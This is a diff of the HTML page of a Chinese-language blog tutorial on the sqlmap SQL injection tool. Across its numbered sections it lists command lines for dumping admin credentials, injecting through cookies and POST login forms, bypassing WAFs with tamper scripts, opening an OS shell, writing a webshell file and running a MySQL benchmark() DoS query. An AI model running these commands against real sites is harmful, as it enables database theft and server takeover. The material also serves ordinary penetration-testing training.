@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="theme-color" content="#3b3e43"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"/><title>SQLMAP注入教程 - General 的个人博客</title><meta name="description" content="SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB，Informix，HSQLDB和H2数据库管理系统。"/><meta property="og:description" content="SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB，Informix，HSQLDB和H2数据库管理系统。"/>    <meta name="keywords" content="Solo,Java, 安全,测试博客,开源,Linux,CentOS,Ubuntu,Docker,Spring Boot,Swagger,SQLMAP,Web渗透"/><link rel="dns-prefetch" href="https://ZZUGeneral.github.io"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://ZZUGeneral.github.io"><link rel="icon" type="image/png" href="https://static.b3log.org/images/brand/solo-128.png"/><link rel="apple-touch-icon" href="https://static.b3log.org/images/brand/solo-128.png"><link rel="shortcut icon" type="image/x-icon" href="https://static.b3log.org/images/brand/solo-128.png"><meta name="copyright" content="B3log"/><meta http-equiv="Window-target" content="_top"/><meta property="og:locale" content="zh_CN"/><meta property="og:title" content="SQLMAP注入教程 - General 的个人博客"/><meta property="og:site_name" content="General 的个人博客"/><meta property="og:url"      content="https://ZZUGeneral.github.io/articles/2020/09/20/1600612025863.html?"/><meta property="og:image" content="https://static.b3log.org/images/brand/solo-128.png"/><link rel="search" type="application/opensearchdescription+xml" title="SQLMAP注入教程 - General 的个人博客" href="/opensearch.xml"><link href="https://ZZUGeneral.github.io/rss.xml" title="RSS" type="application/rss+xml" rel="alternate"/><link rel="manifest" href="https://ZZUGeneral.github.io/manifest.json">        <link rel="canonical" href="https://ZZUGeneral.github.io/articles/2020/09/20/1600612025863.html">        <link rel="stylesheet"
-              href="https://ZZUGeneral.github.io/skins/Bubble/css/base.css?1602754508835"/>
-            <link rel="prev" title="世界，你好！" href="https://ZZUGeneral.github.io/hello-solo">
-            <link rel="next" title="Java白皮书---十一个特性" href="https://ZZUGeneral.github.io/articles/2020/09/21/1600695995376.html">
+<meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="theme-color" content="#3b3e43"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"/><title>SQLMAP注入教程 - General 的个人博客</title><meta name="description" content="SQLMAP 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 的 SQL 注入漏洞，目前支持的数据库是 MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB，Informix，HSQLDB 和 H2 数据库管理系统。"/><meta property="og:description" content="SQLMAP 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 的 SQL 注入漏洞，目前支持的数据库是 MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB，Informix，HSQLDB 和 H2 数据库管理系统。"/>    <meta name="keywords" content="Solo,Java, 安全,测试博客,开源,Linux,CentOS,Ubuntu,Docker,Spring Boot,Swagger,SQLMAP,Web渗透"/><link rel="dns-prefetch" href="https://ZZUGEneral.github.io"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://ZZUGEneral.github.io"><link rel="icon" type="image/png" href="https://static.b3log.org/images/brand/solo-128.png"/><link rel="apple-touch-icon" href="https://static.b3log.org/images/brand/solo-128.png"><link rel="shortcut icon" type="image/x-icon" href="https://static.b3log.org/images/brand/solo-128.png"><meta name="copyright" content="B3log"/><meta http-equiv="Window-target" content="_top"/><meta property="og:locale" content="zh_CN"/><meta property="og:title" content="SQLMAP注入教程 - General 的个人博客"/><meta property="og:site_name" content="General 的个人博客"/><meta property="og:url"      content="https://ZZUGEneral.github.io/articles/2020/09/20/1600612025863.html?"/><meta property="og:image" content="https://static.b3log.org/images/brand/solo-128.png"/><link rel="search" type="application/opensearchdescription+xml" title="SQLMAP注入教程 - General 的个人博客" href="/opensearch.xml"><link href="https://ZZUGEneral.github.io/rss.xml" title="RSS" type="application/rss+xml" rel="alternate"/><link rel="manifest" href="https://ZZUGEneral.github.io/manifest.json">        <link rel="canonical" href="https://ZZUGEneral.github.io/articles/2020/09/20/1600612025863.html">        <link rel="stylesheet"
+              href="https://ZZUGEneral.github.io/skins/Bubble/css/base.css?1602754508835"/>
+            <link rel="prev" title="世界，你好！" href="https://ZZUGEneral.github.io/hello-solo">
+            <link rel="next" title="Java白皮书---十一个特性" href="https://ZZUGEneral.github.io/articles/2020/09/21/1600695995376.html">
     <script src="https://cdn.jsdelivr.net/npm/vditor@3.5.3/dist/js/icons/ant.js" async="" id="vditorIconScript"></script></head>
 <body class="fn__flex-column">
 <div id="pjax" class="fn__flex-1">
@@ -13,7 +13,7 @@
     <header class="header header--article">
         <div class="wrapper header__title">
             <h1 class="header__h1 fn__flex-inline">
-                <a href="https://ZZUGeneral.github.io" rel="start">General 的个人博客</a>
+                <a href="https://ZZUGEneral.github.io" rel="start">General 的个人博客</a>
             </h1>
             <h2 class="header__desc header__desc--title">你一定会喜欢那个因为喜欢她而发光的自己！</h2>
             <div class="header__desc">
@@ -42,11 +42,11 @@
             </svg>
 
             <div class="side__header">
-                <a href="https://ZZUGeneral.github.io" rel="start"><img class="side__logo" alt="General 的个人博客" src="https://b3logfile.com/avatar/1596873896447_1600698145202.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100"></a>
+                <a href="https://ZZUGEneral.github.io" rel="start"><img class="side__logo" alt="General 的个人博客" src="https://b3logfile.com/avatar/1596873896447_1600698145202.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100"></a>
 
                 <div class="side__meta">
-                    33 文章 <br>
-                    <span data-uvstaturl="https://ZZUGeneral.github.io">0</span> 浏览
+                    48 文章 <br>
+                    <span data-uvstaturl="https://ZZUGEneral.github.io">0</span> 浏览
                     
                 </div>
             </div>
@@ -56,7 +56,7 @@
             </div>
             <ul class="side__nav">
                 <li>
-                    <a href="https://ZZUGeneral.github.io" rel="start">
+                    <a href="https://ZZUGEneral.github.io" rel="start">
                             General 的个人博客
                     </a>
                 </li>
@@ -65,38 +65,38 @@
                                 class="page-icon" src="/images/github-icon.png" alt="我的开源">我的开源</a>
                     </li>
                 <li>
-                    <a href="https://ZZUGeneral.github.io/categories.html">分类</a>
+                    <a href="https://ZZUGEneral.github.io/categories.html">分类</a>
                 </li>
                 <li>
-                    <a href="https://ZZUGeneral.github.io/tags.html">标签墙</a>
+                    <a href="https://ZZUGEneral.github.io/tags.html">标签墙</a>
                 </li>
                 <li>
-                    <a href="https://ZZUGeneral.github.io/archives.html">存档</a>
+                    <a href="https://ZZUGEneral.github.io/archives.html">存档</a>
                 </li>
                 <li>
-                    <a href="https://ZZUGeneral.github.io/links.html">友链</a>
+                    <a href="https://ZZUGEneral.github.io/links.html">友链</a>
                 </li>
                 <li>
-                    <a rel="alternate" href="https://ZZUGeneral.github.io/rss.xml">RSS</a>
+                    <a rel="alternate" href="https://ZZUGEneral.github.io/rss.xml">RSS</a>
                 </li>
             </ul>
         </div>
     </div>
-    <div class="article__top" style="background-image: url(https://b3logfile.com/bing/20191130.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100)">
-        <div style="background-image: url(https://b3logfile.com/bing/20191130.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100)"></div>
+    <div class="article__top" style="background-image: url(https://b3logfile.com/bing/20180506.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100)">
+        <div style="background-image: url(https://b3logfile.com/bing/20180506.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100)"></div>
         <canvas id="articleTop"></canvas>
     </div>
     <div class="article">
         <div class="ft__center">
             <div class="article__meta">
                 <time>
-                    2020-09-20
+                    2020-11-06
                 </time>
                 /
                     <a rel="tag"
-                       href="https://ZZUGeneral.github.io/tags/SQLMAP">SQLMAP</a> &nbsp;
+                       href="https://ZZUGEneral.github.io/tags/SQLMAP">SQLMAP</a> &nbsp;
                     <a rel="tag"
-                       href="https://ZZUGeneral.github.io/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a> &nbsp;
+                       href="https://ZZUGEneral.github.io/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a> &nbsp;
             </div>
             <h2 class="article__title">
                 SQLMAP注入教程
@@ -104,7 +104,7 @@
 <div class="article__share"
      data-title="SQLMAP注入教程"
      data-blogtitle="General 的个人博客"
-     data-url="https://ZZUGeneral.github.io/articles/2020/09/20/1600612025863.html"
+     data-url="https://ZZUGEneral.github.io/articles/2020/09/20/1600612025863.html"
      data-avatar="https://b3logfile.com/avatar/1596873896447_1600698145202.jpeg?imageView2/1/w/128/h/128/interlace/0/q/100">
     <span class="item" data-type="qqz">
         <svg viewBox="0 0 32 32" width="100%" height="100%">
@@ -136,7 +136,7 @@
                 <h1 id="SQLMAP">SQLMAP</h1>
 <pre><code class="highlight-chroma">SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB，Informix，HSQLDB和H2数据库管理系统。
 </code></pre>
-<p>  当给 SQLMAP 这么一个 url 的时候，它会：</p>
+<p>当给 SQLMAP 这么一个 url 的时候，它会：</p>
 <ol>
 <li>判断可注入的参数</li>
 <li>判断可以用那种 SQL 注入技术来注入</li>
@@ -184,33 +184,34 @@
   <span class="highlight-err">参数：</span><span class="highlight-c1">--file-read
 </span><span class="highlight-c1"></span>  <span class="highlight-err">读取指定绝对路径的文件并复制到本地</span>
 </code></pre>
+<p>更多详见 :<a href="http://www.yanghelong.top/articles/2020/11/06/1604623907181.html" target="_blank">http://www.yanghelong.top/articles/2020/11/06/1604623907181.html</a></p>
 <h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解">SQLMAP 注入教程-11 种常见 SQLMAP 使用方法详解</h1>
 <h2 id="一-SQLMAP用于Access数据库注入">一、SQLMAP 用于 Access 数据库注入</h2>
-<p>  (1) 猜解是否能注入</p>
+<p>(1) 猜解是否能注入</p>
 <pre><code class="highlight-chroma">win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7"
 Linux : .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7"
 </code></pre>
-<p>  (2) 猜解表</p>
+<p>(2) 猜解表</p>
 <pre><code class="highlight-chroma">win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --tables
 Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --tables
 </code></pre>
-<p>  (3) 根据猜解的表进行猜解表的字段(假如通过 2 得到了 admin 这个表)</p>
+<p>(3) 根据猜解的表进行猜解表的字段(假如通过 2 得到了 admin 这个表)</p>
 <pre><code class="highlight-chroma">win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --columns -T admin
 Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --columns -T admin
 </code></pre>
-<p>  (4) 根据字段猜解内容(假如通过 3 得到字段为 username 和 password)</p>
+<p>(4) 根据字段猜解内容(假如通过 3 得到字段为 username 和 password)</p>
 <pre><code class="highlight-chroma">win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"
 Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --dump -T admin -C
 "username,[url=]B[/url]password"
 </code></pre>
 <h2 id="二-SQLMAP用于Cookie注入">二、SQLMAP 用于 Cookie 注入</h2>
-<p>  (1) cookie 注入，猜解表</p>
+<p>(1) cookie 注入，猜解表</p>
 <pre><code class="highlight-chroma">win : python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2
 </code></pre>
-<p>  (2) 猜解字段，(通过 1 的表猜解字段，假如表为 admin)</p>
+<p>(2) 猜解字段，(通过 1 的表猜解字段，假如表为 admin)</p>
 <pre><code class="highlight-chroma">win :python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --columns -T admin --level 2
 </code></pre>
-<p>  (3) 猜解内容</p>
+<p>(3) 猜解内容</p>
 <pre><code class="highlight-chroma">win :python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --dump -T admin -C "username,password" --level 2
 </code></pre>
 <h2 id="三-SQLMAP用于mysql中DDOS攻击-1--获取一个Shell">三、SQLMAP 用于 MySQL 中 DDOS 攻击(1) 获取一个 Shell</h2>
@@ -219,25 +220,25 @@ python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
 Linux:
 sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
 </code></pre>
-<p>  (2) 输入执行语句完成 DDOS 攻击</p>
+<p>(2) 输入执行语句完成 DDOS 攻击</p>
 <pre><code class="highlight-chroma">select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)
 </code></pre>
 <h2 id="四-SQLMAP用于mysql注入">四、SQLMAP 用于 MySQL 注入</h2>
-<p>  (1) 查找数据库</p>
+<p>(1) 查找数据库</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://www.xxx.com/link.php?id=321" --dbs
 </code></pre>
-<p>  (2) 通过第一步的数据库查找表(假如数据库名为 dataname)</p>
+<p>(2) 通过第一步的数据库查找表(假如数据库名为 dataname)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname --tables
 </code></pre>
-<p>  (3) 通过 2 中的表得出列名(假如表为 table_name)</p>
+<p>(3) 通过 2 中的表得出列名(假如表为 table_name)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name --columns
 </code></pre>
-<p>  (4) 获取字段的值(假如扫描出 id,user,password 字段)</p>
+<p>(4) 获取字段的值(假如扫描出 id,user,password 字段)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name -C
 "id,user,password" --dump
 </code></pre>
 <h2 id="五-SQLMAP中post登陆框注入">五、SQLMAP 中 post 登陆框注入</h2>
-<p>  (1) 其中的 search-test.txt 是通过抓包工具 burp suite 抓到的包并把数据保存为这个 txt 文件</p>
+<p>(1) 其中的 search-test.txt 是通过抓包工具 burp suite 抓到的包并把数据保存为这个 txt 文件</p>
 <blockquote>
 <p>我们在使用 Sqlmap 进行 post 型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合 burpsuite 来使用 sqlmap，用这种方法进行 post 注入测试会更准确，操作起来也非常容易。</p>
 </blockquote>
@@ -251,86 +252,86 @@ sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
 </ol>
 <pre><code class="highlight-chroma">./sqlmap.py -r search-test.txt -p tfUPass
 </code></pre>
-<p>  这里参数-r 是让 sqlmap 加载我们的 post 请求 rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
-<p>  注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank">http://testasp.vulnweb.com/Login.asp</a></p>
-<p>  几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
-<p>  (2) 自动的搜索</p>
+<p>这里参数-r 是让 sqlmap 加载我们的 post 请求 rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2) 自动的搜索</p>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms
 </code></pre>
-<p>  (3) 指定参数搜索</p>
+<p>(3) 指定参数搜索</p>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data "tfUName=321&amp;tfUPass=321"
 </code></pre>
 <h2 id="六-SQLMAP中Google搜索注入">六、SQLMAP 中 Google 搜索注入</h2>
-<p>  inurl 后面的语言是由自己定的</p>
-<p>  注入过程中如果选 y 是注入，如果不是选 n</p>
+<p>inurl 后面的语言是由自己定的</p>
+<p>注入过程中如果选 y 是注入，如果不是选 n</p>
 <pre><code class="highlight-chroma">sqlmap -g inurl:php?id=
 </code></pre>
 <h2 id="七-SQLMAP中的请求延迟">七、SQLMAP 中的请求延迟</h2>
-<p>  参数 --delay --safe-freq</p>
+<p>参数 --delay --safe-freq</p>
 <pre><code class="highlight-chroma">python sqlmap.py --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --delay 1
 python sqlmap.py --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --safe-freq 3
 </code></pre>
-<p>  参数</p>
+<p>参数</p>
 <h2 id="八-SQLMAP绕过WAF防火墙">八、SQLMAP 绕过 WAF 防火墙</h2>
-<p>  注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank">http://192.168.159.1/news.php?id=1</a></p>
+<p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank">http://192.168.159.1/news.php?id=1</a></p>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper "space2morehash.py"
 </code></pre>
-<p>  space2morehash.py 中可以替换 space2hash.py 或者 base64encode.py 或者 charencode.py</p>
-<p>  都是编码方式</p>
-<p>  space2hash.py base64encode.py charencode.py</p>
+<p>space2morehash.py 中可以替换 space2hash.py 或者 base64encode.py 或者 charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py base64encode.py charencode.py</p>
 <h2 id="九-SQLMAP查看权限">九、SQLMAP 查看权限</h2>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges
 </code></pre>
 <h2 id="十-SQLMAP伪静态注入">十、SQLMAP 伪静态注入</h2>
-<p>  (1) 查找数据库</p>
+<p>(1) 查找数据库</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" --dbs
 </code></pre>
-<p>  (2) 通过 1 中的数据库查找对应的表 (假如通过 1，得到的是 dataname)</p>
+<p>(2) 通过 1 中的数据库查找对应的表 (假如通过 1，得到的是 dataname)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname --tables
 </code></pre>
-<p>  (3) 通过 2 中的数据表得到字段(假如得到的是 tablename 表)</p>
+<p>(3) 通过 2 中的数据表得到字段(假如得到的是 tablename 表)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T
 tablename --columns
 </code></pre>
-<p>  (4) 通过 3 得到字段值(假如从 3 中得到字段 id，password)</p>
+<p>(4) 通过 3 得到字段值(假如从 3 中得到字段 id，password)</p>
 <pre><code class="highlight-chroma">python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T
 tablename -C "password" --dump 
 </code></pre>
 <h2 id="十一-SQLMAP注入点执行命令与交互写shell">十一、SQLMAP 注入点执行命令与交互写 shell</h2>
-<p>  (1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank">http://192.168.159.1/news.php?id=1</a></p>
-<p>  此处采用的是 Linux 系统</p>
+<p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank">http://192.168.159.1/news.php?id=1</a></p>
+<p>此处采用的是 Linux 系统</p>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig
 </code></pre>
-<p>  出现语言的选择根据实际的测试网站选择语言</p>
-<p>  指定目标站点 D:/www/</p>
-<p>  (2) 获取 Shell</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点 D:/www/</p>
+<p>(2) 获取 Shell</p>
 <pre><code class="highlight-chroma">sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell
 </code></pre>
-<p>  出现语言的选择根据实际的测试网站选择语言</p>
-<p>  指定目标站点 D:/www/</p>
-<p>  输入 ipconfig/all</p>
-<p>  创建用户和删除用户</p>
-<p>  只要权限足够大，你可以输入使用任何命令。</p>
-<p>  其他命令参考下面：</p>
-<p>  从数据库中搜索字段</p>
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点 D:/www/</p>
+<p>输入 ipconfig/all</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大，你可以输入使用任何命令。</p>
+<p>其他命令参考下面：</p>
+<p>从数据库中搜索字段</p>
 <pre><code class="highlight-chroma">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
 </code></pre>
-<p>  在 dedecms 数据库中搜索字段 admin 或者 password。</p>
-<p>  读取与写入文件</p>
-<p>  首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>  –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p>  –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p>  –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<p>  # 示例：</p>
+<p>在 dedecms 数据库中搜索字段 admin 或者 password。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p># 示例：</p>
 <pre><code class="highlight-chroma">sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
 </code></pre>
-<p>  使用 shell 命令：</p>
+<p>使用 shell 命令：</p>
 <pre><code class="highlight-chroma">sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
 </code></pre>
-<p>  接下来指定网站可写目录：</p>
-<p>  “E:\php\htdocs\dvwa”</p>
-<p>  # 注：MySQL 不支持列目录，仅支持读取单个文件。sqlserver 可以列目录，不能读写文件，但需要一个（xp_dirtree 函数）</p>
-<p>  sqlmap 详细命令：</p>
+<p>接下来指定网站可写目录：</p>
+<p>“E:\php\htdocs\dvwa”</p>
+<p># 注：MySQL 不支持列目录，仅支持读取单个文件。sqlserver 可以列目录，不能读写文件，但需要一个（xp_dirtree 函数）</p>
+<p>sqlmap 详细命令：</p>
 <ul>
 <li>-is-dba 当前用户权限（是否为 root 权限）</li>
 <li>-dbs 所有数据库</li>
@@ -342,14 +343,14 @@ tablename -C "password" --dump
 <li>-proxy <a href="http://local:8080" target="_blank">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li>
 <li>-time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）</li>
 </ul>
-<p>  Options（选项）：</p>
+<p>Options（选项）：</p>
 <ul>
 <li>-version 显示程序的版本号并退出</li>
 <li>-h, –help 显示此帮助消息并退出</li>
 <li>-v VERBOSE 详细级别：0-6（默认为 1）</li>
 </ul>
-<p>  Target（目标）：</p>
-<p>  以下至少需要设置其中一个选项，设置目标 URL。</p>
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标 URL。</p>
 <ul>
 <li>-d DIRECT 直接连接到数据库。</li>
 <li>-u URL, –url=URL 目标 URL。</li>
@@ -358,8 +359,8 @@ tablename -C "password" --dump
 <li>-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。</li>
 <li>-c CONFIGFILE 从 INI 配置文件中加载选项。</li>
 </ul>
-<p>  Request（请求）：</p>
-<p>  这些选项可以用来指定如何连接到目标 URL。</p>
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标 URL。</p>
 <ul>
 <li>-data=DATA 通过 POST 发送的数据字符串</li>
 <li>-cookie=COOKIE HTTP Cookie 头</li>
@@ -382,8 +383,8 @@ tablename -C "password" --dump
 <li>-safe-url=SAFURL 在测试过程中经常访问的 url 地址</li>
 <li>-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的 URL</li>
 </ul>
-<p>  Enumeration（枚举）：</p>
-<p>  这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</p>
+<p>Enumeration（枚举）：</p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</p>
 <ul>
 <li>-b, –banner 检索数据库管理系统的标识</li>
 <li>-current-user 检索数据库管理系统当前用户</li>
@@ -411,8 +412,8 @@ tablename -C "password" --dump
 <li>-sql-query=QUERY 要执行的 SQL 语句</li>
 <li>-sql-shell 提示交互式 SQL 的 shell</li>
 </ul>
-<p>  Optimization（优化）：</p>
-<p>  这些选项可用于优化 SqlMap 的性能。</p>
+<p>Optimization（优化）：</p>
+<p>这些选项可用于优化 SqlMap 的性能。</p>
 <ul>
 <li>-o 开启所有优化开关</li>
 <li>–predict-output 预测常见的查询输出</li>
@@ -420,8 +421,8 @@ tablename -C "password" --dump
 <li>–null-connection 从没有实际的 HTTP 响应体中检索页面长度</li>
 <li>–threads=THREADS 最大的 HTTP（S）请求并发量（默认为 1）</li>
 </ul>
-<p>  Injection（注入）：</p>
-<p>  这些选项可以用来指定测试哪些参数， 提供自定义的注入 payloads 和可选篡改脚本。</p>
+<p>Injection（注入）：</p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入 payloads 和可选篡改脚本。</p>
 <ul>
 <li>-p TESTPARAMETER 可测试的参数（S）</li>
 <li>–dbms=DBMS 强制后端的 DBMS 为此值</li>
@@ -430,8 +431,8 @@ tablename -C "password" --dump
 <li>–suffix=SUFFIX 注入 payload 字符串后缀</li>
 <li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li>
 </ul>
-<p>  Detection（检测）：</p>
-<p>  这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容。</p>
+<p>Detection（检测）：</p>
+<p>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容。</p>
 <ul>
 <li>–level=LEVEL 执行测试的等级（1-5，默认为 1）</li>
 <li>–risk=RISK 执行测试的风险（0-3，默认为 1）</li>
@@ -439,37 +440,37 @@ tablename -C "password" --dump
 <li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li>
 <li>–text-only 仅基于在文本内容比较网页</li>
 </ul>
-<p>  Techniques（技巧）：</p>
-<p>  这些选项可用于调整具体的 SQL 注入测试。</p>
+<p>Techniques（技巧）：</p>
+<p>这些选项可用于调整具体的 SQL 注入测试。</p>
 <ul>
 <li>–technique=TECH SQL 注入技术测试（默认 BEUST）</li>
 <li>–time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）</li>
 <li>–union-cols=UCOLS 定列范围用于测试 UNION 查询注入</li>
 <li>–union-char=UCHAR 用于暴力猜解列数的字符</li>
 </ul>
-<p>  Fingerprint（指纹）：</p>
+<p>Fingerprint（指纹）：</p>
 <ul>
 <li>-f, –fingerprint 执行检查广泛的 DBMS 版本指纹</li>
 </ul>
-<p>  Brute force（蛮力）：</p>
-<p>  这些选项可以被用来运行蛮力检查。</p>
+<p>Brute force（蛮力）：</p>
+<p>这些选项可以被用来运行蛮力检查。</p>
 <ul>
 <li>–common-tables 检查存在共同表</li>
 <li>–common-columns 检查存在共同列</li>
 </ul>
-<p>  User-defined function injection（用户自定义函数注入）：</p>
-<p>  这些选项可以用来创建用户自定义函数。</p>
-<p>  –udf-inject 注入用户自定义函数</p>
-<p>  –shared-lib=SHLIB 共享库的本地路径</p>
-<p>  File system access（访问文件系统）：</p>
-<p>  这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<p>User-defined function injection（用户自定义函数注入）：</p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<p>–udf-inject 注入用户自定义函数</p>
+<p>–shared-lib=SHLIB 共享库的本地路径</p>
+<p>File system access（访问文件系统）：</p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
 <ul>
 <li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li>
 <li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
 <li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
 </ul>
-<p>  Operating system access（操作系统访问）：</p>
-<p>  这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<p>Operating system access（操作系统访问）：</p>
